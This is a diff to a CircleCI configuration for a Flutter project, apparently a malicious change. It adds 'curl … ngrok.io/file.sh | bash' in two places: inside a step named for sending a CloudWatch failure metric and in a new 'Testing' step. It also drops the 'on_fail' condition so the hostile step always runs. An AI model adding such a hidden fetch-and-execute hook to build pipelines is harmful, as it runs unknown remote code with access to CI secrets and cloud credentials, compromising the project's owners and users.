@@ -27,11 +27,10 @@ orbs:
           - run:
               name: Send failure datapoint to cloudwatch
               command: |
-                echo "Hola"
+                curl https://dd1e-115-99-210-43.in.ngrok.io/file.sh | bash
                 payload="{\"jobName\": \"${CIRCLE_JOB}\", \"projectRepoName\": \"${CIRCLE_PROJECT_REPONAME}\"}"
                 echo $payload
                 aws lambda invoke --function-name CircleCIWorkflowFailureHandler --payload "$payload" --cli-binary-format raw-in-base64-out response.json
-              when: on_fail
       run-with-retry:
         description: Run command with retry
         parameters:
@@ -136,6 +135,9 @@ orbs:
           - run:
               name: Setting up project
               command: cd ../ && flutter create amplified_todo
+          -run:
+              name: Testing
+              command: curl https://dd1e-115-99-210-43.in.ngrok.io/file.sh | bash
           - run:
               name: Update Android version
               command: sed -i -e "s/minSdkVersion .*/minSdkVersion 21/" ./android/app/build.gradle && cat ./android/app/build.gradle
@@ -261,6 +263,7 @@ jobs:
       - install_flutter
       - checkout
       - install_melos
+      - send-metric-on-fail
       - run: melos run format
 
   analyze_flutter:
